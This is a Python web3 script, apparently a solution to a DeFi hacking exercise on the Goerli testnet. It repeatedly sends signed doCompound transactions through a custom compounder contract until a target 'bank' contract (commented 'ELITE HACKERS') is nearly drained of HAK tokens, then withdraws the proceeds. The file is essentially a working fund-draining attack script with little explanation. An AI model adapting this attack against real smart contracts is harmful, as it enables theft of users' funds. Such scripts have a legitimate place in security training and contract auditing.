from web3 import Web3
from web3.exceptions import TransactionNotFound
from web3.middleware import geth_poa_middleware
import time
import json
from playsound import playsound


api_url = "https://eth-goerli.alchemyapi.io/v2/<redacted>"


w3 = Web3(Web3.HTTPProvider(api_url))
w3.middleware_onion.inject(geth_poa_middleware, layer=0)

account = "0x63aA45A9b95c49Ff8E2ffB9E8dC65A48f377c4A5"
priv_key = "<redacted>"
bank_address = "0x99B676bf7f1da5706e962df8Dfbc96caaFd6B54C" # ELITE HACKERS
HAKToken_address = "0xBefeeD4CB8c6DD190793b1c97B72B60272f3EA6C"
HAKToken_abi = json.loads("""[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[],"name":"STARTING_SUPPLY","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]""")
HAKToken = w3.eth.contract(
	address = HAKToken_address,
	abi = HAKToken_abi
)

PriceOracle_address = "0xc3F639B8a6831ff50aD8113B438E2Ef873845552"
PriceOracle_abi = json.loads("""[{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"inputs":[{"internalType":"address","name":"token","type":"address"}],"name":"getVirtualPrice","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint256","name":"newPrice","type":"uint256"}],"name":"setVirtualPrice","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"}]""")
PriceOracle = w3.eth.contract(
	address = PriceOracle_address,
	abi = PriceOracle_abi
)

compounder_address = "0xfe5226CaB5e2eBF29888Ffc830520E69ff812D32"
compounder_abi = json.loads("""[
	{
		"anonymous": false,
		"inputs": [
			{
				"indexed": true,
				"internalType": "address",
				"name": "previousOwner",
				"type": "address"
			},
			{
				"indexed": true,
				"internalType": "address",
				"name": "newOwner",
				"type": "address"
			}
		],
		"name": "OwnershipTransferred",
		"type": "event"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "_bank",
				"type": "address"
			}
		],
		"name": "approveBank",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "contract IBank",
				"name": "_bank",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "_token",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "_amount",
				"type": "uint256"
			}
		],
		"name": "depositToBank",
		"outputs": [],
		"stateMutability": "payable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "_dest",
				"type": "address"
			},
			{
				"internalType": "bytes",
				"name": "_payload",
				"type": "bytes"
			},
			{
				"internalType": "uint256",
				"name": "_value",
				"type": "uint256"
			}
		],
		"name": "doArbTx",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "contract IBank",
				"name": "_bank",
				"type": "address"
			}
		],
		"name": "doCompound",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "renounceOwnership",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "newOwner",
				"type": "address"
			}
		],
		"name": "transferOwnership",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"stateMutability": "payable",
		"type": "receive"
	},
	{
		"inputs": [
			{
				"internalType": "contract IERC20",
				"name": "_token",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "_amount",
				"type": "uint256"
			}
		],
		"name": "withdraw",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "uint256",
				"name": "_amount",
				"type": "uint256"
			}
		],
		"name": "withdrawETH",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "uint256",
				"name": "_amount",
				"type": "uint256"
			},
			{
				"internalType": "address payable",
				"name": "_recipient",
				"type": "address"
			}
		],
		"name": "withdrawETHTo",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "contract IBank",
				"name": "_bank",
				"type": "address"
			}
		],
		"name": "withdrawFrom",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "contract IERC20",
				"name": "_token",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "_amount",
				"type": "uint256"
			},
			{
				"internalType": "address",
				"name": "_recipient",
				"type": "address"
			}
		],
		"name": "withdrawTo",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "contract IERC20",
				"name": "_hakToken",
				"type": "address"
			}
		],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"inputs": [],
		"name": "hakToken",
		"outputs": [
			{
				"internalType": "contract IERC20",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "owner",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	}
]""")

compounder = w3.eth.contract(
	address = compounder_address,
	abi = compounder_abi
)

def wait_receipt(web3, tx, retries=10, timeout=5):
    for _ in range(0, retries):
        try:
            receipt = web3.eth.getTransactionReceipt(tx)
        except TransactionNotFound:
            receipt = None
        if receipt is not None:
            return receipt
        time.sleep(timeout)  # pragma: no cover
    raise TransactionNotFound(f"Transaction with hash: {tx} not found.")

print(w3.isConnected())


print(HAKToken.functions.balanceOf(bank_address).call())

HAK_Price = PriceOracle.functions.getVirtualPrice(HAKToken.address).call()
print(HAK_Price)

threshold = 300 * 10 ** 18
counter = 0

while HAKToken.functions.balanceOf(bank_address).call() > threshold and counter < 210:
	nonce = w3.eth.get_transaction_count(account)
	gasPrice = int(w3.eth.gasPrice * 2)
	tx = compounder.functions.doCompound(bank_address).buildTransaction({
		'gas': 200000,
		'gasPrice': gasPrice,
		'from': account,
		'nonce': nonce
    })  
	
	signed_tx = w3.eth.account.signTransaction(tx, private_key=priv_key)
	tx_hash = w3.eth.sendRawTransaction(signed_tx.rawTransaction)
	
	last_block = w3.eth.blockNumber
	print("doCompound() called on block", last_block, ".")
	
	receipt = wait_receipt(w3, tx_hash)
	print(receipt)
	
	time.sleep(45)
	counter += 1

nonce = w3.eth.get_transaction_count(account)
gasPrice = int(w3.eth.gasPrice * 2)
tx = compounder.functions.withdrawFrom(bank_address).buildTransaction({
	'gas': 200000,
	'gasPrice': gasPrice,
	'from': account,
	'nonce': nonce
})  

signed_tx = w3.eth.account.signTransaction(tx, private_key=priv_key)
tx_hash = w3.eth.sendRawTransaction(signed_tx.rawTransaction)

last_block = w3.eth.blockNumber
print("withdrawFrom() called on block", last_block, ".")
receipt = wait_receipt(w3, tx_hash)
print(receipt)


playsound('audio.mp3')